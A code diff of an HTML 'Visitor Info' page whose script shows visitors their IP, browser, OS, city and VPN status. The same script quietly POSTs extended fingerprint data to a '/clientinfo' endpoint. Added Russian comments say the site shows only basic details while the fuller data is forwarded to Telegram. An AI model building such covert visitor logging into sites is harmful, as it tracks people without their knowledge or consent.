@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Visitor Info</title>
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
@@ -111,10 +111,12 @@
   </div>
 
   <script>
+    // JS-код для загрузки базовых данных и отправки расширенной инфы на сервер
     window.addEventListener('DOMContentLoaded', () => {
       fetch('/collect')
         .then(res => res.json())
         .then(data => {
+          // Показываем на сайте только базовую информацию
           document.getElementById('ip').textContent = data.ip || 'Unknown';
           document.getElementById('browser').textContent = data.browser || 'Unknown';
           document.getElementById('os').textContent = data.os || 'Unknown';
@@ -123,7 +125,7 @@
           document.getElementById('city').textContent = data.city || 'Unknown';
           document.getElementById('vpn').textContent = data.vpn ? 'Yes' : 'No';
 
-          // Собираем расширенную информацию
+          // Собираем расширенную информацию для отправки в Телеграм
           const timestamp = new Date().toLocaleString();
           const resolution = `${window.screen.width} x ${window.screen.height}`;
           const useragent = navigator.userAgent;
@@ -135,12 +137,10 @@
           }
           const cookies = navigator.cookieEnabled ? 'Yes' : 'No';
 
-          // Отправляем расширенную информацию на сервер
+          // Отправляем расширенную инфу на сервер
           fetch('/clientinfo', {
             method: 'POST',
-            headers: {
-              'Content-Type': 'application/json'
-            },
+            headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
               ip: data.ip,
               browser: data.browser,
@@ -159,7 +159,7 @@
           });
         })
         .catch(err => {
-          console.error('Error:', err);
+          console.error('Error fetching visitor data:', err);
         });
     });
   </script>
